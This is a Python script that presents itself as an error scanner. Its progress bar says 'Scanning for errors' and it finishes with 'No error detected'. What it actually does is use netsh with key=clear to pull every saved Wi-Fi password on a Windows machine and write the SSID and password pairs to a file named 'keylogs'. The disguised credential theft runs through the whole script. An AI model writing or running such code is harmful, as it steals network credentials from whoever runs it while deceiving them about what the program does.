import subprocess
import re
from tqdm import tqdm
import os
import time

def get_next_filename(base_filename):
    index = 1
    while True:
        next_filename = f"{base_filename}{index}.txt"
        if not os.path.exists(next_filename):
            return next_filename
        index += 1

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True)

# Check if the initial command failed
if command_output.returncode != 0:
    print("Initial command failed. Running alternative command.")
    
    # Run an alternative command (change directory to system32)
    try:
        subprocess.run(["cd", "../../windows/system32"], check=True)
        print("Alternative command executed successfully.")
        
        # Retry the initial command
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running alternative command: {e}")
        exit()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output.stdout.decode()))

wifi_list = []

if len(profile_names) != 0:
    for name in tqdm(profile_names, desc="Scanning for errors"):
        wifi_profile = {}
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                               capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password is None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

# Get the next available filename
next_filename = get_next_filename("keylogs")

# Write wifi_list values to the file
with open(next_filename, "w") as file:
    for wifi in wifi_list:
        file.write(f"SSID: {wifi['ssid']}, Password: {wifi['password']}\n")


print("Scanning completed. No error detected")
time.sleep(1)  # Introduce a 1-second delay
